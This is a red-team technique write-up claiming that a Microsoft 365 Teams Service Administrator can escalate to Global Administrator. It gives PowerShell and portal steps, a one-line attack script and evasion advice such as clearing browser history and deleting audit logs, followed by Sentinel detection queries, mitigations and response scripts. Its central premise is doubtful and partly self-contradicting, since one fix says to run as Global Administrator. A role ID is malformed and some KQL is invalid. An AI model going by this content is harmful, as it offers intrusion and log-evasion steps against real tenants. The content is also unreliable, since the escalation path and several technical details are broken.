# [PE-ACCTMGMT-004]: Teams Admin to Global Admin

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-004 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Microsoft 365 / Entra ID |
| **Severity** | **High** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All M365 tenants with Teams enabled |
| **Patched In** | N/A (Design behavior) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** The Teams Service Administrator role in Microsoft 365 grants broad permissions over Teams tenant configurations and service settings. An attacker with Teams Admin privileges can escalate to Global Administrator through manipulation of administrative account permissions, unauthorized Global Admin role assignments, or service principal credential manipulation. Unlike many escalation techniques that require complex exploits, this method leverages misconfigured role permissions and the interconnected nature of M365 service administration.

**Attack Surface:** The Teams Admin Center, Microsoft Graph API endpoints related to Teams service principals and role assignments, and the Azure Entra ID administrative interface.

**Business Impact:** **Complete M365 tenant compromise.** Once elevated to Global Administrator, an attacker gains unrestricted access to all Microsoft 365 services, including Exchange Online, SharePoint, Teams, Entra ID, Azure resources, and data encryption keys. This enables wholesale data exfiltration, mailbox access, account creation/deletion, security policy modification, and ransomware deployment.

**Technical Context:** This escalation typically takes 5-30 minutes to execute and has a **low detection likelihood** if conducted during normal business hours or with proper timing to blend with legitimate administrative activity. The attack leaves audit trail evidence in the Unified Audit Log under "Add member to role" operations but may be missed by organizations without dedicated monitoring for privilege escalation events.

### Operational Risk

- **Execution Risk:** Low - No exploits required; uses standard M365 administrative interfaces and APIs.
- **Stealth:** Medium - Creates audit log entries but can be masked in organizations with poor logging coverage or large volumes of legitimate admin activity.
- **Reversibility:** No - Once Global Admin role is assigned, damage is irreversible without account recovery procedures. Service principals with added credentials cannot be fully remediated until credentials are revoked and service is restarted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 1.1.1 | Ensure Global administrator accounts are used sparingly and role-based access control (RBAC) is implemented |
| **DISA STIG** | M365-SRG-DM-001 | Enforce principle of least privilege for administrative roles |
| **NIST 800-53** | AC-2, AC-3, AC-6 | Account Management, Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - administrative access controls |
| **DORA** | Art. 9 | Protection and Prevention - identity and access management |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - privileged access management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario 3.2 | Compromise of Administration Interface |

---

## Technical Prerequisites

- **Required Privileges:** Teams Service Administrator role (or Cloud Application Administrator, Application Administrator with Graph API access)
- **Required Access:** Authenticated access to Teams Admin Center (portal.office.com/admin/teams) or Microsoft Graph API
- **Network:** HTTPS access to admin.microsoft.com, graph.microsoft.com

**Supported Versions:**
- **M365 Tenants:** All current versions (2024-2025)
- **Entra ID:** All current versions with Teams integration
- **PowerShell:** Version 5.0+ (Windows) or PowerShell Core 7.0+ (cross-platform)

**Required Tools:**
- [Microsoft.Graph PowerShell Module](https://learn.microsoft.com/en-us/graph/sdk/sdk-installation) (Version 2.0+)
- [ExchangeOnlineManagement Module](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2?view=exchange-ps) (Version 3.0+)
- [MicrosoftTeams Module](https://learn.microsoft.com/en-us/powershell/module/teams/?view=teams-ps) (Version 4.9.0+)

---

## Environmental Reconnaissance

### PowerShell Reconnaissance - Check Current Role and Permissions

```powershell
# Connect to Microsoft Graph with current user context
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"

# Get current user's assigned roles
$currentUser = Get-MgContext | Select-Object -ExpandProperty Account
$userId = (Get-MgUser -Filter "userPrincipalName eq '$($currentUser)'").Id

# List all assigned roles for current user
Get-MgUserMemberOf -UserId $userId -All | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.directoryRole' } | Select-Object DisplayName, Id

# Check if Teams Admin role is present
Get-MgUserMemberOf -UserId $userId -All | Where-Object { $_.DisplayName -eq 'Teams Service Administrator' }
```

**What to Look For:**
- If output contains "Teams Service Administrator", the current user holds this role
- If result is empty, the user does NOT have this role and cannot perform this escalation technique
- Look for any other administrative roles listed (Cloud App Admin, Application Admin, etc.)

**Version Note:** Works on all current M365 tenants; no version-specific variants.

### Azure CLI Alternative - Check Teams Admin Role Membership

```bash
# Install Azure CLI if not present
# https://learn.microsoft.com/en-us/cli/azure/install-azure-cli

az login
az ad role member list --role-id "69091246-6b7b-47a3-a953-f0db4c5f59f"  # Teams Service Admin role ID
```

---

## Detailed Execution Methods

### METHOD 1: Using Microsoft Graph PowerShell (Recommended)

**Supported Versions:** All M365 (2024-2025)

#### Step 1: Authenticate to Microsoft Graph

**Objective:** Establish authenticated session to Microsoft Graph with delegated permissions for role assignment.

**Command:**

```powershell
# Install module if needed
Install-Module Microsoft.Graph -Force

# Connect to Microsoft Graph with necessary scopes
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory", "User.ReadWrite.All"

# Verify successful authentication
Get-MgContext
```

**Expected Output:**

```
TenantId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
ClientId: 14d82eec-204b-4c2f-b3e2-2b3734c32e91
Scopes: {RoleManagement.ReadWrite.Directory, User.ReadWrite.All}
AuthType: Delegated
```

**What This Means:**
- `TenantId` confirms connection to correct tenant
- `Scopes` must include `RoleManagement.ReadWrite.Directory` to assign roles
- `AuthType: Delegated` means authentication is via user credentials (Teams Admin account)

**OpSec & Evasion:**
- This operation creates audit log entries in AuditLogs with OperationName "Add member to role"
- **Detection Likelihood:** Medium - occurs during daytime hours, may blend with legitimate admin activity
- To evade: Run during bulk admin maintenance windows or when audit logs are not being actively monitored
- Clear browser history and close Teams Admin Center after execution

**Troubleshooting:**

- **Error:** `Connect-MgGraph: AADSTS65001: The user or admin has not consented to use the application...`
  - **Cause:** Scopes require administrative consent
  - **Fix:** Run as Global Administrator or use `az login` with admin account, or grant consent via Azure Portal → App Registrations

- **Error:** `Get-MgContext: The term 'Get-MgContext' is not recognized`
  - **Cause:** Microsoft.Graph module not imported
  - **Fix:** Run `Import-Module Microsoft.Graph.Authentication` or reinstall module

---

#### Step 2: Identify Target User for Global Admin Assignment

**Objective:** Find the user account to elevate to Global Administrator (typically the attacker's own account or a compromised account).

**Command:**

```powershell
# Get current authenticated user
$currentUser = Get-MgContext | Select-Object -ExpandProperty Account
Write-Host "Current User: $currentUser"

# Alternative: Get target user by UPN
$targetUPN = "attacker@victim.onmicrosoft.com"
$targetUser = Get-MgUser -Filter "userPrincipalName eq '$targetUPN'"

Write-Host "Target User ID: $($targetUser.Id)"
Write-Host "Target User: $($targetUser.UserPrincipalName)"
```

**Expected Output:**

```
Target User ID: 12345678-1234-1234-1234-123456789012
Target User: attacker@victim.onmicrosoft.com
```

**What This Means:**
- `User ID` is the unique identifier needed for role assignment
- Confirms target account exists in the tenant

---

#### Step 3: Get the Global Administrator Role ID

**Objective:** Retrieve the Entra ID object ID for the Global Administrator role.

**Command:**

```powershell
# Get Global Administrator role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

if ($null -eq $globalAdminRole) {
    # If role not yet activated, activate it
    $roleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'"
    $newRole = New-MgDirectoryRole -RoleTemplateId $roleTemplate.Id
    $globalAdminRole = $newRole
}

Write-Host "Global Admin Role ID: $($globalAdminRole.Id)"
```

**Expected Output:**

```
Global Admin Role ID: 62e90394-69f5-4237-9190-012177145e10
```

**What This Means:**
- This is the standard Microsoft-managed role ID for Global Administrator
- If role is not activated, the script automatically activates it (can trigger detection)

---

#### Step 4: Assign Global Administrator Role to Target User

**Objective:** Add the target user to the Global Administrator role membership.

**Command:**

```powershell
# Assign Global Administrator role
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $targetUser.Id

# Verify assignment
$rolesAfter = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id | Where-Object { $_.Id -eq $targetUser.Id }

if ($rolesAfter) {
    Write-Host "SUCCESS: Global Admin role assigned to $($targetUser.UserPrincipalName)"
} else {
    Write-Host "FAILED: Assignment did not complete"
}
```

**Expected Output:**

```
SUCCESS: Global Admin role assigned to attacker@victim.onmicrosoft.com
```

**What This Means:**
- Role assignment is complete and immediately active
- User can now access all M365 services with Global Administrator privileges
- This operation appears in audit logs within 5-10 minutes

**OpSec & Evasion:**
- Role assignment appears in AuditLogs table with OperationName = "Add member to role"
- **Detection Likelihood:** High - no way to hide this in audit logs
- **Evasion Strategy:** 
  - Assign role immediately after legitimate admin performs a bulk action (creates noise)
  - Use a service principal with Cloud App Admin role (harder to trace to individual)
  - Delete audit logs afterwards (requires additional escalation, risky)

---

#### Step 5: Verify Escalation Success (Optional)

**Objective:** Confirm Global Administrator role assignment from the target user's perspective.

**Command (Run from target user's account):**

```powershell
# Connect as the newly elevated user
$cred = Get-Credential  # Enter target user credentials
Disconnect-MgGraph
Connect-MgGraph -Credential $cred -Scopes "RoleManagement.Read.Directory"

# Get current user's roles
$currentUserId = (Get-MgUser -Filter "userPrincipalName eq '$($cred.UserName)'").Id
$roles = Get-MgUserMemberOf -UserId $currentUserId -All | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.directoryRole' }

$roles | ForEach-Object { Write-Host "Role: $($_.DisplayName)" }
```

**Expected Output:**

```
Role: Global Administrator
```

**References & Proofs:**
- [Microsoft Learn - Assign Entra ID roles with Graph](https://learn.microsoft.com/en-us/graph/api/directoryrole-post-members?view=graph-rest-1.0&tabs=powershell)
- [Microsoft Graph PowerShell - New-MgDirectoryRoleMember](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.directorymanagement/new-mgdirectoryrolemember?view=graph-powershell-1.0)

---

### METHOD 2: Using Teams Admin Center (GUI - Lower OpSec, Higher Risk)

**Supported Versions:** All M365 (2024-2025)

#### Step 1: Access Teams Admin Center

**Objective:** Navigate to Teams Admin Center and authenticate as Teams Service Administrator.

**Manual Steps:**

1. Open browser and navigate to **https://admin.teams.microsoft.com**
2. Sign in with Teams Service Administrator account
3. Verify successful login (should see Teams admin dashboard)
4. Go to **Users** → **Manage users** (left sidebar)

**What to Look For:**
- Presence of "Users" option in left menu confirms Teams Admin role
- If option is grayed out, current account lacks sufficient permissions

---

#### Step 2: Navigate to Entra ID Roles

**Objective:** Access Entra ID role management interface from Teams Admin Center.

**Manual Steps:**

1. From Teams Admin Center, click **Roles** (if available in left menu)
2. Or navigate directly to Azure Portal: **https://portal.azure.com**
3. Go to **Entra ID** → **Roles and administrators** (left sidebar)
4. Search for **"Global Administrator"** role

**What to Look For:**
- Confirmation that user can see Entra ID role listings
- "Global Administrator" role appears in search results

---

#### Step 3: Assign Global Administrator Role via Azure Portal

**Objective:** Add target user to Global Administrator role membership.

**Manual Steps:**

1. In **Entra ID** → **Roles and administrators**, click **Global Administrator**
2. Click **+ Add assignments**
3. Search for target user email (e.g., "attacker@victim.onmicrosoft.com")
4. Click the user in results
5. Click **Add** (bottom of screen)
6. Confirm assignment in notification popup

**Expected Result:**
- User appears in "Assigned" list for Global Administrator role
- Role activation is immediate

**OpSec & Evasion:**
- **Detection Likelihood:** Very High - Browser history will show Azure Portal access
- **Evasion:** Use incognito/private browsing mode; clear cookies after session
- **Better Approach:** Use PowerShell instead (harder to track)

---

#### Step 4: Verify Escalation via Azure Portal

**Objective:** Confirm target user now appears as Global Administrator.

**Manual Steps:**

1. While still in **Entra ID** → **Roles and administrators** → **Global Administrator**
2. Check **Assigned** tab
3. Look for target user in the list
4. (Optional) Click user entry to view assignment details

**Expected Result:**
- Target user appears with assignment status "Active"
- Can click on user to see assignment date/time

---

### METHOD 3: Using Service Principal with Cloud Application Administrator Role (Highest Privilege Escalation)

**Supported Versions:** All M365 (2024-2025)

**Prerequisites:** Must have Cloud Application Administrator or Application Administrator role assigned to a Service Principal.

#### Step 1: Authenticate with Service Principal

**Objective:** Establish authenticated session using Service Principal credentials.

**Command:**

```powershell
# Variables
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Your tenant ID
$clientId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Service Principal app ID
$clientSecret = "your_client_secret_value"          # Service Principal secret

# Create credential object
$securePassword = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $securePassword)

# Connect using service principal
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential
```

**Expected Output:**

```
TenantId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
ClientId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
AuthType: AppOnly
```

**What This Means:**
- `AuthType: AppOnly` confirms service principal authentication
- More dangerous than delegated auth because it bypasses MFA
- Creates audit trail but harder to attribute to individual user

---

#### Step 2: Add Target User as Global Administrator (via Service Principal)

**Objective:** Elevate user privileges using service principal's elevated permissions.

**Command:**

```powershell
# Get target user
$targetUPN = "attacker@victim.onmicrosoft.com"
$targetUser = Get-MgUser -Filter "userPrincipalName eq '$targetUPN'"

# Get Global Admin role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Assign role
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $targetUser.Id

Write-Host "Escalation complete: $($targetUser.UserPrincipalName) is now Global Administrator"
```

**Why This is Dangerous:**
- Service principal escalations are harder to trace to individual users
- Can persist across multiple logins
- Service principal credentials can be stored in CI/CD pipelines or code repositories
- Multiple service principals can be created, making enumeration difficult

**Detection:** Appears in AuditLogs but source is a service principal, not a user account.

---

## Attack Simulation & Verification

### Atomic Red Team Test

- **Atomic Test ID:** T1098.003-2 (Partial - Custom variant)
- **Test Name:** Assign Entra ID Global Administrator Role via PowerShell
- **Description:** Simulates privilege escalation by assigning Global Administrator role to a test user account.
- **Supported Versions:** M365 2024+
- **Command:**

```powershell
# Atomic Red Team-style test
Import-Module Microsoft.Graph.Identity.DirectoryManagement

$testUserUPN = "atomictest@$($env:USERDOMAIN)"
$testUser = Get-MgUser -Filter "userPrincipalName eq '$testUserUPN'"

if ($testUser) {
    $globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
    New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $testUser.Id
    Write-Host "Test: User $testUserUPN assigned Global Administrator role"
} else {
    Write-Host "Test: User $testUserUPN not found"
}
```

- **Cleanup Command:**

```powershell
# Remove Global Administrator role from test user
$testUser = Get-MgUser -Filter "userPrincipalName eq '$testUserUPN'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $testUser.Id
Write-Host "Cleanup: Global Administrator role removed from $testUserUPN"
```

**Reference:** [Atomic Red Team - T1098.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md#atomic-test-4---azure-ad---adding-user-to-azure-ad-role)

---

## Tools & Commands Reference

### Microsoft.Graph PowerShell Module

**Version:** 2.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core 7.0+ (cross-platform)

**Installation:**

```powershell
# Install module
Install-Module Microsoft.Graph -Force -Scope CurrentUser

# Update module
Update-Module Microsoft.Graph

# Verify installation
Get-Module Microsoft.Graph -ListAvailable
```

**Key Cmdlets for This Technique:**

```powershell
# Authentication
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
Disconnect-MgGraph

# Role Operations
Get-MgDirectoryRole                              # List all Entra ID roles
Get-MgDirectoryRoleMember -DirectoryRoleId      # List members of a role
New-MgDirectoryRoleMember                        # Add user to role
Remove-MgDirectoryRoleMember                     # Remove user from role

# User Operations
Get-MgUser -Filter "userPrincipalName eq '...'" # Find user by UPN
Get-MgUserMemberOf -UserId                       # Get user's group/role memberships
```

**Version Notes:**
- Version 2.0+: Current and recommended
- Version 1.x: Legacy (use 2.0+)
- Breaking changes: Parameter names changed in v2.0 (use `-Filter` instead of `-Query`)

---

### Complete Attack Script (One-Liner Concept)

```powershell
# Full escalation in ~10 lines
Import-Module Microsoft.Graph.Identity.DirectoryManagement; 
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"; 
$user = Get-MgUser -Filter "userPrincipalName eq 'attacker@victim.onmicrosoft.com'"; 
$role = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"; 
New-MgDirectoryRoleMember -DirectoryRoleId $role.Id -DirectoryObjectId $user.Id; 
Write-Host "Escalation Success: $($user.UserPrincipalName) is Global Admin"
```

---

## Microsoft Sentinel Detection

### Query 1: Detect Global Administrator Role Assignment

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Result
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All M365 tenants

**KQL Query:**

```kusto
AuditLogs
| where OperationName has ("Add member to role" or "Add eligible member to role")
| where TargetResources[0].displayName contains "Global Administrator"
| where Result == "Success"
| project 
    TimeGenerated,
    OperationName,
    InitiatedByUser=InitiatedBy.user.userPrincipalName,
    InitiatedByIP=InitiatedBy.ipAddress,
    TargetUser=TargetResources[0].displayName,
    ModifiedProperties
| order by TimeGenerated desc
```

**What This Detects:**
- Any successful assignment of Global Administrator role to any user
- Line 2-3: Filters for role assignment operations
- Line 4: Specifically targets Global Administrator role
- Line 5: Only flagged successful assignments
- Shows who initiated the assignment, from which IP, and target user

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Global Administrator Role Assignment - Alert`
   - Description: `Detects unauthorized assignment of Global Administrator role`
   - Severity: `Critical`
   - Status: `Enabled`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**: `On`
   - Group related alerts: `By all entities`
7. Click **Review and create** → **Create**

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Define rule parameters
$rule = @{
    ResourceGroupName = $ResourceGroup
    WorkspaceName = $WorkspaceName
    DisplayName = "Global Administrator Role Assignment"
    Query = @"
AuditLogs
| where OperationName has ("Add member to role" or "Add eligible member to role")
| where TargetResources[0].displayName contains "Global Administrator"
| where Result == "Success"
| project TimeGenerated, OperationName, InitiatedByUser=InitiatedBy.user.userPrincipalName, TargetUser=TargetResources[0].displayName
"@
    Severity = "Critical"
    Enabled = $true
    Frequency = "PT5M"
    Period = "PT1H"
}

# Create the rule
New-AzSentinelAlertRule @rule
```

**Source:** [Microsoft Sentinel GitHub - Privilege Escalation Detection](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/)

---

### Query 2: Detect Multiple Role Assignments in Short Timeframe

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TimeGenerated
- **Alert Threshold:** > 3 role assignments in 10 minutes
- **Alert Severity:** High

**KQL Query:**

```kusto
AuditLogs
| where OperationName has ("Add member to role" or "Add eligible member to role")
| where Result == "Success"
| summarize 
    AssignmentCount = count(),
    UniqueTargets = dcount(TargetResources[0].displayName),
    FirstAssignment = min(TimeGenerated),
    LastAssignment = max(TimeGenerated)
    by InitiatedBy.user.userPrincipalName, InitiatedBy.ipAddress
| where AssignmentCount >= 3
| project 
    InitiatedByUser=InitiatedBy_user_userPrincipalName,
    SourceIP=InitiatedBy_ipAddress,
    AssignmentCount,
    UniqueTargets,
    TimeRange = (LastAssignment - FirstAssignment)
| where TimeRange <= 10m
| order by AssignmentCount desc
```

**What This Detects:**
- Bulk role assignment activity (possible compromised admin account or service principal abuse)
- Multiple assignments from same user in short timeframe suggests automated attack

---

## Defensive Mitigations

### Priority 1: CRITICAL

- **Implement Privileged Identity Management (PIM) for all administrative roles:** Remove permanent Global Administrator assignments and require time-limited activation.
  
  **Applies To Versions:** All M365 (2024+)
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management** (left sidebar)
  2. Click **Roles** (not visible? Click **Azure resources**)
  3. Select **Entra ID roles**
  4. Click **Global Administrator**
  5. Click **Settings** (gear icon, top-right)
  6. Under **Activation** section:
     - **Activation maximum duration:** Set to `1` hour (or less)
     - **Require MFA on activation:** Toggle `ON`
     - **Require justification on activation:** Toggle `ON`
  7. Click **Update**
  
  **PowerShell (Entra ID only - Requires Premium P2):**
  ```powershell
  # Configure PIM for Global Administrator role
  $roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role ID
  
  # Remove permanent assignments and require activation
  # Note: Requires Microsoft.Graph.Identity.Governance module
  Update-MgRoleManagementPolicy -UnifiedRoleManagementPolicyId $roleId -MaxActivationDuration "PT1H"
  ```

- **Restrict Teams Admin role assignment:** Only assign Teams Service Administrator to dedicated admin accounts, never to day-to-day service accounts.
  
  **Manual Steps:**
  1. Go to **Entra ID** → **Roles and administrators**
  2. Search for **"Teams Service Administrator"**
  3. Review all assigned users
  4. Remove Teams Admin role from non-essential accounts
  5. Document legitimate Teams Admin accounts in security registry

- **Enable cloud-only administrative accounts:** Ensure Global Administrator and other privileged roles are assigned only to cloud-only Entra ID accounts (not synced from on-premises AD).
  
  **Manual Steps:**
  1. **Entra ID** → **Users**
  2. Filter: **Source** = **Cloud**
  3. Verify all privileged users appear in this list
  4. For synced users with privileges, create cloud-only equivalents
  5. Use new cloud-only accounts for admin tasks going forward

---

### Priority 2: HIGH

- **Enforce Conditional Access policies:** Require device compliance, location restrictions, and MFA for all administrative access.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Admin Access to Compliant Devices`
  4. **Assignments:**
     - Users: Click **Include** → Select **Directory roles** → Check **Global Administrator**, **Teams Service Administrator**, **Cloud Application Administrator**, **Application Administrator**
     - Cloud apps: Select **All cloud apps**
  5. **Conditions:**
     - Device state: **Device state** = **Require device to be marked as compliant**
     - Locations: (Optional) **Include** = **Selected locations** (internal networks only)
  6. **Access controls:**
     - Grant: **Require all of the selected controls:**
       - [x] Require device to be marked as compliant
       - [x] Require Multi-factor authentication
  7. **Enable policy:** `On`
  8. Click **Create**

- **Implement multi-admin approval:** Require two admins to approve high-risk role assignments.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Settings** → **Role settings**
  2. Select **Global Administrator** role
  3. Under **Activation** section, check:
     - **Require approval to activate:** `ON`
     - **Select approvers:** Add 2+ senior admins
  4. Click **Update**
  
  **Applies To:** Intune and other services support Multi-Admin Approval
  1. **Intune Admin Center** → **Settings** → **Admin Approval**
  2. Toggle **Multi-admin approval** = `ON`
  3. Add 2+ approvers for role changes

- **Enable Restricted Management Administrative Units (RMAU):** Protect privileged user accounts and groups from modification by non-Global Admin roles.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Administrative units**
  2. Click **+ New administrative unit**
  3. Name: `Tier0-PrivilegedAdmins`
  4. **Members:** Add all Global Admin and other Tier 0 privileged accounts
  5. Click **Create**
  6. Go back to the new AU → **Roles** tab
  7. **Restricted** to **Global Administrator** role only
  8. Verify: Now only Global Admins can modify members

---

### Priority 3: MEDIUM

- **Implement role delegation:** Separate Teams Admin responsibilities into granular roles (Teams Devices Administrator, Teams Communications Administrator, etc.).
  
  **Manual Steps:**
  1. **Entra ID** → **Roles and administrators**
  2. Review available Teams-related roles:
     - Teams Service Administrator
     - Teams Devices Administrator
     - Teams Communications Administrator
     - (Others)
  3. Assign only the minimum necessary roles to each admin
  4. Remove unnecessary Teams Service Admin assignments

- **Audit and monitor role assignments:** Run monthly audits of who has administrative roles.
  
  **PowerShell Audit Script:**
  ```powershell
  # Export all Global Admin assignments
  $globalAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'").Id
  $globalAdmins | ForEach-Object {
      $user = Get-MgUser -UserId $_.Id
      Write-Host "$($user.UserPrincipalName) - Mail: $($user.Mail) - Account Type: $(if($user.OnPremisesSyncEnabled) {'Hybrid'} else {'Cloud'})"
  }
  ```

- **Implement Azure Policy:** Prevent creation of Entra ID roles outside of PIM.
  
  **Manual Steps:**
  1. **Azure Portal** → **Policy** → **Definitions**
  2. Create custom policy that denies permanent role assignments
  3. Enforce through policy initiative scoped to relevant resource groups

---

### RBAC/PIM Configuration Validation

**Verification Command:**

```powershell
# Check if PIM is enforcing role activation
$globalAdminRole = Get-MgRoleManagementPolicy -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole'" | Where-Object { $_.displayName -like "*Global Administrator*" }

# Get rule details
Get-MgRoleManagementPolicyRule -UnifiedRoleManagementPolicyId $globalAdminRole.Id | Select-Object RuleType, IsExpirationRequired, MaximumDuration

Write-Host "PIM Enabled: $(if($globalAdminRole) {'YES'} else {'NO'})"
```

**Expected Output (If Secure):**

```
RuleType: Activation
IsExpirationRequired: True
MaximumDuration: PT1H
PIM Enabled: YES
```

**What to Look For:**
- `IsExpirationRequired` should be `True`
- `MaximumDuration` should be short (1-8 hours max)
- If PIM not enabled, implement immediately

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Audit Log Operations:**
  - `Add member to role`
  - `Add eligible member to role`
  - Operation Name contains "role" + Result="Success"

- **Suspicious patterns:**
  - Global Administrator assignment after hours (outside 9am-5pm business hours)
  - Multiple role assignments from same account in <30 minutes
  - Role assignment originating from non-internal IP address
  - Role assignment by non-privileged account (indicative of account compromise)

---

### Forensic Artifacts

- **Unified Audit Log (AuditLogs table):**
  - `OperationName`: "Add member to role"
  - `TargetResources[0].displayName`: "Global Administrator"
  - `ModifiedProperties`: Contains role assignment details
  - **Retention:** 90 days (default)

- **Sign-in Logs (SigninLogs table):**
  - Look for Teams Admin account sign-ins immediately before/after role assignment
  - Check for sign-ins from unusual locations/IPs

- **Azure Activity Logs (AzureActivity table):**
  - DirectoryRoleMembers modify operations
  - Microsoft.Directory/roleMemberships/write

---

### Response Procedures

#### 1. Immediate Containment

**If Global Admin assignment detected (< 5 minutes):**

```powershell
# IMMEDIATELY revoke the malicious Global Admin assignment
$suspiciousUser = "attacker@victim.onmicrosoft.com"
$user = Get-MgUser -Filter "userPrincipalName eq '$suspiciousUser'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $user.Id

Write-Host "REVOKED: $suspiciousUser is no longer Global Administrator"

# Revoke all active sessions
Revoke-MgUserSignInSession -UserId $user.Id

Write-Host "All sessions revoked for $suspiciousUser"
```

**Manual (Azure Portal):**
1. Go to **Entra ID** → **Roles and administrators** → **Global Administrator**
2. Click **Assigned** tab
3. Find suspicious user
4. Click **X** to remove assignment
5. Confirm removal

---

#### 2. Collect Evidence

**PowerShell:**

```powershell
# Export relevant audit logs
$auditLogs = Search-UnifiedAuditLog -Operations "Add member to role" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -ResultSize 5000

$auditLogs | Select-Object UserIds, Operations, ClientIP, CreationDate | Export-Csv -Path "C:\Evidence\RoleAssignment_Audit.csv"

# Export sign-in activity for suspicious user
Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'attacker@victim.onmicrosoft.com'" -All | Export-Csv -Path "C:\Evidence\SigninLogs.csv"

Write-Host "Forensic evidence exported to C:\Evidence\"
```

**Manual:**
1. **Azure Portal** → **Microsoft Audit Log** (not Entra ID audit)
2. Search filters:
   - **Date range:** Last 7 days
   - **Activities:** "Add member to role"
   - **Users:** [Target account]
3. Right-click results → **Export to CSV**

---

#### 3. Remediate

```powershell
# Step 1: Remove all suspicious service principals
$suspiciousSPs = Get-MgServicePrincipal -Filter "createdDateTime gt 2025-01-01" | Where-Object { $_.appDisplayName -like "*attacker*" -or $_.appOwnerOrganizationId -ne (Get-MgContext).TenantId }

$suspiciousSPs | ForEach-Object {
    Remove-MgServicePrincipal -ServicePrincipalId $_.Id
    Write-Host "Removed service principal: $($_.appDisplayName)"
}

# Step 2: Reset passwords for all Global Admin accounts
$globalAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'").Id

$globalAdmins | ForEach-Object {
    $user = Get-MgUser -UserId $_.Id
    # Note: Password reset requires additional permissions; delegate to admin
    Write-Host "ACTION REQUIRED: Reset password for $($user.UserPrincipalName)"
}

# Step 3: Force re-authentication for all users
Write-Host "RECOMMENDATION: Force global re-authentication (requires Microsoft support)"
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes Teams Admin credentials via fake device login |
| **2** | **Credential Access** | [CA-TOKEN-009] Teams Token Extraction | Compromise Teams Admin's refresh token for persistent access |
| **3** | **Current Step** | **[PE-ACCTMGMT-004]** | **Escalate Teams Admin to Global Administrator** |
